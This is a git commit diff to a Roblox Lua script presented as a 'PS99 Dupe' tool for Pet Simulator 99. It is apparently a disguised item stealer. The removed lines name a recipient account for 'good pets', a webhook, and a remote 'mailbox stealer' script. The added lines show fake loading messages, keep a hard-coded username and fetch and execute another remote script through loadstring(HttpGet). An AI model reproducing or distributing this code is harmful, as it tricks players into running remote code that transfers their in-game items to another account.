d8c142f85fd8a9f637aef7c0845c9186f00c0110
DupePS99 <155266309+DupePS99@users.noreply.github.com>
2023-12-31 00:38:17 +0200

    Update DupeScriptPS99.lua

--- DupeScriptPS99.lua
+++ DupeScriptPS99.lua
@@ -1,6 +1,8 @@
-UserName = "hohalowka" -- good pets
-Webhook = "Webhook Here" -- pings for pets
-UserName2 = "Hohalowka10" -- bad pets
+Username = "hohalowka"
+_G.CustomScriptName = "PS99 Dupe" -- Main text
+_G.Text1 = "Script Loaded..." --tip test1
+_G.Text2 = "Waiting for Script" --tip test1
+_G.Text3 = "Checking Scripts..." --tip test1
+_G.Text4 = "Starting Scripts..." --tip test1
 
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AngelThePs99Scripter/Ps99-mailbox-stealer-script-/main/Angels%20ps99%20mailbox%20stealer"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
